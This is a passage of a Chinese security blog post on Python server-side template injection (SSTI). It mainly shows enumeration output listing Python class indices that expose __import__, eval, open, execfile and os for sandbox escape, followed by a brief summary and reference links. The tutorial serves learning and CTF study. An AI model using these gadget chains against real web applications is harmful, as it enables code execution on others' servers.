&lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">(79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;__import__&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;compile&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)</span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)</span><br><span class="line">----------4-----------</span><br><span class="line">(60, &#39;__import__&#39;)</span><br><span class="line">(60, &#39;file&#39;)</span><br><span class="line">(60, &#39;repr&#39;)</span><br><span class="line">(60, &#39;compile&#39;)</span><br><span class="line">(60, &#39;eval&#39;)</span><br><span class="line">(60, &#39;open&#39;)</span><br><span class="line">(60, &#39;execfile&#39;)</span><br><span class="line">进一步获取可以直接执行命令或者读取文件的类</span><br><span class="line"></span><br><span class="line">----------1-----------                                                                </span><br><span class="line">(40, &#39;file&#39;)                                                                          </span><br><span class="line">----------2-----------                                                                </span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   </span><br><span class="line">(59, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    </span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;linecache&#39;, [&#39;os&#39;, &#39;sys&#39;, &#39;__builtins__&#39;])   </span><br><span class="line">(60, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;types&#39;, [&#39;__builtins__&#39;])                    </span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                   </span><br><span class="line">(72, &lt;class &#39;site._Printer&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                  </span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;traceback&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;])                    </span><br><span class="line">(77, &lt;class &#39;site.Quitter&#39;&gt;, &#39;os&#39;, [&#39;sys&#39;, &#39;__builtins__&#39;, &#39;open&#39;])                   </span><br><span class="line">(78, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;, None)                               </span><br><span class="line">(79, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;, None)                               </span><br><span class="line">----------3-----------                                                                </span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;file&#39;)                                   </span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;eval&#39;)                                   </span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;open&#39;)                                   </span><br><span class="line">(59, 13, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &#39;execfile&#39;)                               </span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;file&#39;)                                   </span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;eval&#39;)                                   </span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;open&#39;)                                   </span><br><span class="line">(60, 13, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &#39;execfile&#39;)                               </span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;file&#39;)                                </span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;eval&#39;)                                </span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;open&#39;)                                </span><br><span class="line">(61, 1, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &#39;execfile&#39;)                            </span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;file&#39;)                                        </span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;eval&#39;)                                        </span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;open&#39;)                                        </span><br><span class="line">(62, 1, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &#39;execfile&#39;)                                    </span><br><span class="line">(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             </span><br><span class="line">(72, 20, &lt;class &#39;site._Printer&#39;&gt;, &#39;exec&#39;)                                             </span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;file&#39;)                                             </span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;eval&#39;)                                             </span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;open&#39;)                                             </span><br><span class="line">(72, 23, &lt;class &#39;site._Printer&#39;&gt;, &#39;execfile&#39;)                                         </span><br><span class="line">(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              </span><br><span class="line">(77, 20, &lt;class &#39;site.Quitter&#39;&gt;, &#39;exec&#39;)                                              </span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;file&#39;)                                              </span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;eval&#39;)                                              </span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;open&#39;)                                              </span><br><span class="line">(77, 23, &lt;class &#39;site.Quitter&#39;&gt;, &#39;execfile&#39;)                                          </span><br><span class="line">(78, 21, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 </span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;file&#39;)                                 </span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;eval&#39;)                                 </span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;open&#39;)                                 </span><br><span class="line">(78, 23, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &#39;execfile&#39;)                             </span><br><span class="line">(79, 21, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 </span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;file&#39;)                                 </span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;eval&#39;)                                 </span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;open&#39;)                                 </span><br><span class="line">(79, 23, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &#39;execfile&#39;)                             </span><br><span class="line">----------4-----------                                                                </span><br><span class="line">(60, &#39;file&#39;)                                                                          </span><br><span class="line">(60, &#39;repr&#39;)                                                                          </span><br><span class="line">(60, &#39;eval&#39;)                                                                          </span><br><span class="line">(60, &#39;open&#39;)                                                                          </span><br><span class="line">(60, &#39;execfile&#39;)</span><br></pre></td></tr></table></figure>



<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>梳理了一遍以后，感觉其实ssti注入也不难，难的是一开始面对啥也不懂的手足无措，不知道从哪入手，现在可能还是有一些小点不是很懂，但是终于是没那么陌生了</p>
<p>参考:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885#toc-1">https://xz.aliyun.com/t/6885#toc-1</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226900#h3-14">https://www.anquanke.com/post/id/226900#h3-14</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679#toc-9">https://xz.aliyun.com/t/3679#toc-9</a><br><a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E5%8A%A8%E6%89%8B%E5%AE%9E%E8%B7%B5">https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E5%8A%A8%E6%89%8B%E5%AE%9E%E8%B7%B5</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8029#toc-7">https://xz.aliyun.com/t/8029#toc-7</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/258136.html">https://www.freebuf.com/articles/network/258136.html</a><br><a target="_blank" rel="noopener" href="https://juejin.cn/post/6908600736754434056#heading-13">https://juejin.cn/post/6908600736754434056#heading-13</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>python SSTI注入(一)</p><p><a href="http://example.com/2021/02/28/python-SSTI注入/">http://example.com/2021/02/28/python-SSTI注入/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>vague huang</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2021-02-28</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2022-08-14</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="notification is-danger">You need to set <code>install_url</code> to use ShareThis. Please set it in <code>_config.yml</code>.</div></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">Like this article? Support the author with</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>Afdian.net</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>Alipay</span><span class="qrcode"><img src="/" alt="Alipay"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>Buy me a coffee</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a><div class="notification is-danger">You forgot to set the <code>business</code> or <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>Wechat</span><span class="qrcode"><img src="/" alt="Wechat"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/03/02/i%E6%98%A5%E7%A7%8B10/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">i春秋10</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/02/27/python%E7%B1%BB%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"><span class="level-item">python类相关基础知识学习</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" alt="Your name"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Your name</p><p class="is-size-6 is-block">Your title</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Your location</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">255</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Categories</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">18</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">Follow</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-02-14T05:23:36.000Z">2023-02-14</time></p><p class="title"><a href="/2023/02/14/access%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-20T06:32:13.000Z">2023-01-20</time></p><p class="title"><a href="/2023/01/20/java-jndi%E6%B3%A8%E5%85%A5/">java-jndi注入</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-15T06:32:13.000Z">2023-01-15</time></p><p class="title"><a href="/2023/01/15/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">shiro反序列化漏洞</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-12T06:32:13.000Z">2023-01-12</time></p><p class="title"><a href="/2023/01/12/javacc4/">java-cc4、cc2、cc5、cc7</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-01-10T06:32:13.000Z">2023-01-10</time></p><p class="title"><a href="/2023/01/10/java_cc%E9%93%BE%E5%B0%8F%E7%BB%93/">java_cc链小结</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/02/"><span class="level-start"><span class="level-item">February 2023</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2023/01/"><span class="level-start"><span class="level-item">January 2023</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/12/"><span class="level-start"><span class="level-item">December 2022</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/11/"><span class="level-start"><span class="level-item">November 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/10/"><span class="level-start"><span class="level-item">October 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/09/"><span class="level-start"><span class="level-item">September 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/08/"><span class="level-start"><span class="level-item">August 2022</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/07/"><span class="level-start"><span class="level-item">July 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/05/"><span class="level-start"><span class="level-item">May 2022</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/04/"><span class="level-start"><span class="level-item">April 2022</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/03/"><span class="level-start"><span class="level-item">March 2022</span></span><span class="level-end"><span class="level-item tag">15</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/02/"><span class="level-start"><span class="level-item">February 2022</span></span><span class="level-end"><span class="level-item tag">17</span></span></a></li><li><a class="level is-mobile" href="/archives/2022/01/"><span class="level-start"><span class="level-item">January 2022</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/12/"><span class="level-start"><span class="level-item">December 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/11/"><span class="level-start"><span class="level-item">November 2021</span></span><span class="level-end"><span class="level-item tag">12</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/10/"><span class="level-start"><span class="level-item">October 2021</span></span><span class="level-end"><span class="level-item tag">18</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/09/"><span class="level-start"><span class="level-item">September 2021</span></span><span class="level-end"><span class="level-item tag">18</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/08/"><span class="level-start"><span class="level-item">August 2021</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/07/"><span class="level-start"><span class="level-item">July 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/06/"><span class="level-start"><span class="level-item">June 2021</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">May 2021</span></span><span class="level-end"><span class="level-item tag">9</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">April 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">March 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">February 2021</span></span><span class="level-end"><span class="level-item tag">22</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">January 2021</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">December 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">November 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">October 2020</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CSRF/"><span class="tag">CSRF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MYSQL/"><span class="tag">MYSQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/PHP/"><span class="tag">PHP</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/XSS/"><span class="tag">XSS</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bugku/"><span class="tag">bugku</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/bugku2/"><span class="tag">bugku2</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/hexo/"><span class="tag">hexo</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/html/"><span class="tag">html</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/html%E5%8E%9F%E7%90%86/"><span class="tag">html原理</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/php/"><span class="tag">php</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sqlmap/"><span class="tag">sqlmap</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/sql%E6%B3%A8%E5%85%A5/"><span class="tag">sql注入</span><span class="tag">9</span></a></div><div class="control"><a class="tags has-addons" href="/tags/typro/"><span class="tag">typro</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/xss/"><span class="tag">xss</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%8F%8D%E5%BC%B9shell/"><span class="tag">反弹shell</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="tag">文件上传</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="tag">文件包含</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tag">渗透测试</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Tlife" height="28"></a><p class="is-size-7"><span>&copy; 2023 vague huang</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2019</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
